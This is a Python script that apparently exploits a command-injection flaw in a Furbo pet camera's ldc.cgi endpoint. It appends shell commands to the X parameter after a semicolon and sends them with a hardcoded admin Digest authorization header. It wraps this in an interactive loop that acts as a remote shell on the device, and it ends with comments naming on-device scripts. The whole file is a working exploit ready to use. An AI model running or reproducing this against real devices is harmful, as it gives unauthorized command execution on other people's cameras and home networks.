import requests
import re
camera_ip = "ENTER YOUR CAMERA IP HERE"
camera_cgi = camera_ip +"/cgi-bin/ldc.cgi"

# Sends packet to Furbo camera with you code injected into the x_value parameter
def send_request(x_value):
    url = camera_cgi

    headers = {
        'Authorization': 'Digest username="admin", realm="ycam.com", nonce="305c6990bf6f729492d06a297dd65dbc", uri="/cgi-bin/ldc.cgi?STRENGTH=0&X=1000&Y=540&zoom_num=1000&zoom_denum=1980&mode=1&pano_h_fov=0", response="f0759f665363934e981bd4e3ac5a1bef", qop=auth, nc=00000005, cnonce="1c297d4064f6f2b7"',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.65 Safari/537.36',
        'X-Requested-With': 'XMLHttpRequest',
        'Referer': camera_ip + '/',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US,en;q=0.9'
    }

    params = {
        'STRENGTH': '0',
        'X': f';export PATH=/usr/local/bin/:/bin:/sbin:$PATH;{x_value};',
        'Y': '540',
        'zoom_num': '1000',
        'zoom_denum': '1980',
        'mode': '1',
        'pano_h_fov': '0'
    }

    # Get resposne 
    response = requests.get(url, headers=headers, params=params)
    # print(response.text)

    ### Filter packet response to make it look like terminal
    # remove "unknown option found: 63" and everything after it
    text = re.sub(r'unknown option found: 63.*', '', response.text)
    # remove everything after "/usr/local/bin/test_ldc"
    text = re.sub(r'/usr/local/bin/test_ldc.*', '', text)
    print(text)

while(True):
    request = input(": ")
    send_request(request)

# fb_led.sh blue
# fb_night.sh
# fb_toss_loop.sh 1